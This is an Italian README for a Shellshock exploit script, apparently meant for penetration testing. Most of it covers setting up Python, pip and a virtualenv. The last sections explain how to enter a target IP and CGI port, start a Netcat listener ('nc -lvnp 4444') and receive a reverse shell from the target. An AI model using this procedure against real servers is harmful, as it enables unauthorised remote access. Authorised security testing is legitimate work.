## Prerequisiti

  

  

-  **Python**: 3.10.12

  

  

-  **Pip**: 22.0.2

  

  

## Installazione

  

  

### Installare `pip` su Ubuntu

  

  

Se non hai `pip` e stai usando Ubuntu, puoi installarlo utilizzando lo script `get-pip.py`.

  

  

#### Passaggi:

  

  

1.  **Scarica lo script `get-pip.py`:**

  

Prima, devi scaricare il file `get-pip.py`. Puoi farlo utilizzando `curl` o `wget`:

  

  

- Con `curl`:

  

```bash

  

curl  https://bootstrap.pypa.io/get-pip.py  -o  get-pip.py

  

```

  

  

- Con `wget`:

  

```bash

  

wget  https://bootstrap.pypa.io/get-pip.py

  

```

  

  

2.  **Installa `pip` eseguendo il file `get-pip.py`:**

  

Una volta scaricato il file, esegui il comando per installare `pip`:

  

  

Python 3.x:

  

```bash

  

python3  get-pip.py

  

```

  

  

Se necessario, puoi anche usare `sudo` su Ubuntu per avere i permessi di amministratore:

  

  

```bash

  

sudo  python3  get-pip.py

  

```

  

  

#### Verifica l'installazione di `pip`:

  

  

Dopo l'installazione, puoi verificare che `pip` sia stato correttamente installato con il comando:

  

  

```bash

  

pip  --version

```

## Creare un ambiente virtuale in Python su Ubuntu

  

#### Passaggi

  

1.  **Installa**  `venv` (se non è già installato) `venv` è il modulo ufficiale di Python per la creazione di ambienti virtuali. Su Ubuntu, `venv` dovrebbe essere già incluso con Python 3. Tuttavia, se non fosse presente, puoi installarlo con:

```bash

sudo  apt  install  python3-venv

```

  

2.  **Crea l'ambiente virtuale**

```bash

python3  -m  venv  venv

```

  

3.  **Attiva l'ambiente virtuale**

```bash

source  venv/bin/activate

```

Una volta attivato, il prompt del terminale cambierà per indicare che sei dentro l'ambiente virtuale. Di solito, mostrerà qualcosa come `(myenv)` prima del prompt.

  

## Installare le dipendenze

  

1.**Le dipendenze** di un progetto Python sono generalmente elencate in un file chiamato `requirements.txt`. Per installare tutte le dipendenze all'interno dell'ambiente virtuale, usa il comando `pip`:

```bash

pip  install  -r  requirements.txt

```

  
  
  

## Eseguire lo script

Una volta installata le librerie ed aver attivato l'ambiente virtuale, puoi eseguire lo script usando il comando Python:

  

```bash

python  Shellshock_PT2.py

```

Se usi Python 3, e hai entrambi Python 2.x e 3.x installati, potrebbe essere necessario usare:

  

```bash

python3  Shellshock_PT2.py

```

## Interazione con lo script:

Lo script ti chiederà delle informazioni in input. Quando eseguirai lo script, ti verranno chiesti i seguenti dati:

  


- Indirizzo IP del target: L'indirizzo IP del server vulnerabile su cui vuoi inviare il payload.

  

- Porta del CGI: La porta su cui il CGI (Common Gateway Interface) è in esecuzione sul server del target (di solito 80 per HTTP o 443 per HTTPS).

  

- Indirizzo IP locale (tuo): Il tuo indirizzo IP sul quale ascolterai la shell di ritorno.

  

- Porta del listener Netcat: La porta sulla quale il tuo listener Netcat è in attesa di connessioni in ingresso (deve essere lo stesso indirizzo e porta che usi per il listener Netcat).

```bash
Inserisci l'indirizzo IP del target: 192.168.1.100
Inserisci la porta del CGI (solitamente 80 o 443): 80
Inserisci il tuo indirizzo IP per la reverse shell: 192.168.1.10
Inserisci la porta del tuo listener Netcat: 4444
```

  

## Configurazione del listener Netcat

Prima di eseguire lo script, devi avviare il listener Netcat sul tuo computer per ascoltare la connessione in arrivo. Puoi farlo con il comando:

  

```bash

nc  -lvnp <porta>

```

Ad esempio, se la tua porta è 4444, esegui:

  

```bash

nc  -lvnp  4444

```

Questo comando avvierà un listener sulla porta 4444 in attesa di una connessione.

  

## Esegui il test

Una volta che il listener Netcat è attivo e hai inserito i dati richiesti dallo script, lo script invierà il payload al target. Se tutto è configurato correttamente, il target dovrebbe connettersi al tuo Netcat, dandoti una **reverse shell**.

Dopo aver inviato il payload, il terminale di Netcat dovrebbe mostrare una connessione stabilita.

### Esempio di output del listener Netcat

```bash
listening on [any] 4444 ...
connect to [192.168.1.10] from (UNKNOWN) [192.168.1.100] 12345
```

Se vedi questo tipo di output, significa che la reverse shell è riuscita e hai ottenuto l'accesso al sistema target.
